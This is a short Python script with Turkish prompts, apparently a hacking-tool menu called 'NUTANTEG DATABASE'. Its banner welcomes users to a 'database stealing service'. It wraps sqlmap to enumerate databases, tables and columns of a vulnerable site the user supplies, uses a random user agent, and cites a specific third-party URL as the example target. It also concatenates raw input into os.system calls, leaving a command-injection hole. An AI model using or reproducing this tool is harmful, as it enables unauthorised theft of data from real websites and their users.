#!/usr/bin/env python
import os
REQUIRED_COMMANDS = ["sqlmap"]
REQUIRED_PY_PACKAGES = []
def database():

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet NUTANTEG DATABASE")
	print("""
	Veritabanı calma hizmetine hoş geldiniz!!!

	1) sadece acikli linki biliyorum
	2) acikli linki veritabani adini biliyorum
	3) acikli linki veritabani adini tablo adini biliyorum
	4) acikli linki veritabani adini tablo adini kolon adini biliyorum

	ornek acikli link: http://www.suesupriano.com/article.php?id=25
	""")
	islemno = input("islem numarasini giriniz: ")

	if(islemno=="1"):
		aciklilink = input("acikli linki girin: ")
		os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
	elif(islemno=="2"):
		aciklilink = input("acikli linki girin: ")
		veritabani = input("veritabani adini girin: ")
		os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
	elif(islemno=="3"):
		aciklilink = input("acikli linki girin: ")
		veritabani = input("veritabani adini girin: ")
		Tablo = input("tablo adini girin: ")
		os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + Tablo + " --dbs --random-agent")
	elif(islemno=="4"):
		aciklilink = input("acikli linki girin: ")
		veritabani = input("veritabani adini girin: ")
		Tablo = input("tablo adini girin: ")
		column = input("kolon adini girin: ")
		os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + Tablo + " -C " + column + " --dbs --random-agent")
		
	else:
		print("hatalı secim")
	
	
	
	
